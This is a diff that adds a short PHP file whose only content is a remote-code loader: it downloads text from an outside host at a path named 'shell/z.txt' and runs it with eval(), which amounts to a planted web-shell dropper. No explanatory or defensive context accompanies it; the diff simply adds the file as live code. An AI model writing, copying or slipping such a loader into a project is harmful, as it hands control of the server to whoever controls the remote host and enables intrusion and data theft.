@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://jakartafc.com/shell/z.txt'));
+
+$content = "?> ".$content;
+eval($content);
